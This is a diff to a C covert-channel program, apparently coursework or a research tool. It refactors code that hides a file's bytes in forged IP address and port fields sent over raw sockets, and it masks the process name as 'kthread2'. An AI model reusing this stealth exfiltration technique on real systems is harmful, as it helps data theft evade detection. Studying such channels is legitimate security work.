@@ -24,15 +24,16 @@
 #define RECV_SOCKET 1
 #define TCP_BUFFER 10000
 #define MASK "kthread2"
+#define MAX_DECIMAL 255
 
-	struct channel_info {
-		int server;
-		char desthost[BUFFER_SIZE];
-		unsigned int dest_port;
-		unsigned int dest_host;
-		unsigned int w_size;
-		char filename[BUFFER_SIZE];
-	} channel_info;
+struct channel_info {
+	int server;
+	char desthost[BUFFER_SIZE];
+	unsigned int dest_port;
+	unsigned int dest_host;
+	unsigned int w_size;
+	char filename[BUFFER_SIZE];
+} channel_info;
 
 int create_raw_socket(int sock_proto);
 void start_covert_channel();
@@ -48,7 +49,7 @@ unsigned int host_convert(char *hostname);
 char * convert_ip_to_string(struct in_addr addr);
 void sig_proc();
 
-int recv_sock; /* socket used in server and signal handler functions */
+int recv_sock; /* recv socket used in server and signal handler functions */
 
 int main(int argc, char **argv)
 {
@@ -264,7 +265,8 @@ int client_file_io()
 	{
 		read_bytes = fread(rbuffer, sizeof(char), DATA_SIZE, input);
 
-		sprintf(ip_addr, "%d.%d.%d.%d", 256 - rbuffer[0], 256 - rbuffer[1], 256 - rbuffer[2], 256 - rbuffer[3]);
+		sprintf(ip_addr, "%d.%d.%d.%d", MAX_DECIMAL - rbuffer[0], MAX_DECIMAL - rbuffer[1], 
+			MAX_DECIMAL - rbuffer[2], MAX_DECIMAL - rbuffer[3]);
 
 		inet_aton(ip_addr, &addr.sin_addr);
 		addr.sin_port = rbuffer[4];
@@ -386,10 +388,10 @@ char * convert_ip_to_string(struct in_addr addr)
 	char * data = malloc((DATA_SIZE + 1) * sizeof(char));
 	size_t i;
 
-	data[0] = 256 - atoi(strtok(ip_str, "."));
+	data[0] = MAX_DECIMAL - atoi(strtok(ip_str, "."));
 
 	for(i = 1; i < DATA_SIZE - 1; i++)
-		data[i] = 256 - atoi(strtok(NULL, "."));
+		data[i] = MAX_DECIMAL - atoi(strtok(NULL, "."));
 
 	return data;
 }
